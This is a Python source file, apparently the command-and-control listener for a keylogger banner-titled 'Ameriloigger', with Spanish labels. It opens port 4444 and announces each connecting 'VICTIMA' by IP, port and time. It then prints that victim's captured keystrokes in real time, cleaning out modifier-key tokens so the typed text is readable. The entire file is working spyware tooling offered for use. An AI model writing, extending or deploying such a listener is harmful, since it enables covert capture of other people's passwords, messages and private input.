import socket
from datetime import datetime
import time
import threading
import sys

print("""
    ___                        _ __                       
   /   |  ____ ___  ___  _____(_) /___  ____ _____ ____  _____
  / /| | / __ `__ \/ _ \/ ___/ / / __ \/ __ `/ __ `/ _ \/ ___/
 / ___ |/ / / / / /  __/ /  / / / /_/ / /_/ / /_/ /  __/ /    
/_/  |_/_/ /_/ /_/\___/_/  /_/_/\____/\__, /\__, /\___/_/     
                                     /____//____/              
""")

esperando = True

def parpadeo():
    puntos = 0
    while esperando:
        texto = 'Escuchando' + '.' * puntos
        espacios = ' ' * ((60 - len(texto)) // 2)
        sys.stdout.write('\r' + ' ' * 70)  
        sys.stdout.write('\r' + espacios + texto)
        sys.stdout.flush()
        puntos = (puntos + 1) % 4
        time.sleep(0.5)

thread_parpadeo = threading.Thread(target=parpadeo, daemon=True)
thread_parpadeo.start()

s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(('0.0.0.0', 4444))
s.listen(1)

conn, addr = s.accept()

esperando = False
time.sleep(0.6)
sys.stdout.write('\r' + ' ' * 70 + '\r')
sys.stdout.flush()

hora_conexion = datetime.now().strftime("%H:%M:%S")
print(f"[+] VICTIMA CONECTADA")
print(f"    IP: {addr[0]}")
print(f"    Puerto: {addr[1]}")
print(f"    Hora: {hora_conexion}")
print("\n" + "="*60)
print("CAPTURA EN TIEMPO REAL:")
print("="*60 + "\n")

while True:
    try:
        data = conn.recv(1024)
        if not data:
            print("\n\n" + "="*60)
            print("[!] Conexion cerrada por la victima")
            print("="*60)
            break

        texto = data.decode('utf-8', errors='ignore')
        
        texto = texto.replace('[BACK]', '')
        texto = texto.replace('[TAB]', '\t')
        texto = texto.replace('[shift]', '')
        texto = texto.replace('[shift_r]', '')
        texto = texto.replace('[caps_lock]', '')
        texto = texto.replace('[ctrl]', '')
        texto = texto.replace('[ctrl_r]', '')
        texto = texto.replace('[alt]', '')
        texto = texto.replace('[alt_r]', '')
        texto = texto.replace('[cmd]', '')
        texto = texto.replace('[Key.', '[')
        
        print(texto, end='', flush=True)

    except KeyboardInterrupt:
        print("\n\n" + "="*60)
        print("[!] Listener detenido manualmente")
        print("="*60)
        break
    except Exception as e:
        print("\n\n" + "="*60)
        print(f"[!] Error en conexion: {e}")
        print("="*60)
        break

conn.close()
s.close()
